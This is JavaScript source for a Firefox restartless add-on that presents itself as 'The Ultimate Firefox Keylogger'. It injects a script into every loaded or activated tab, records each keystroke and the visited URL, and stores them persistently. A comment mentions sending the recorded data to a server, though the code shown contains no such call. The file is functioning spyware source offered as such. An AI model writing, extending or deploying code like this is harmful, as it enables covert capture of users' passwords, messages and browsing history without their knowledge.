/****************************************************************
The Ultimate Firefox Keylogger - Restartless Add-on
*****************************************************************/

var tabs = require("sdk/tabs");
var ss = require("sdk/simple-storage");
ss.storage.pages = [];
ss.storage.data = ss.storage.data || "";

// Track keyboard actions when page loading is complete
tabs.on("ready", function(tab) {
  ss.storage.pages.push(tab.url);
  var worker = tab.attach({
    contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
  });
  worker.port.on('storage', function(data){
    if(data.length == 1)
      ss.storage.data += data;
    else
      ss.storage.data += "["+data+"]";
  });
});


// Send recorded data to server and track new set of keyboard actions when current tab is activated
tabs.on("activate", function(tab) {
  ss.storage.pages.push(tab.url);
  var worker = tab.attach({
    contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
  });
  worker.port.on('storage', function(data){
    if(data.length == 1)
      ss.storage.data += data;
    else
      ss.storage.data += "["+data+"]";
  });
});
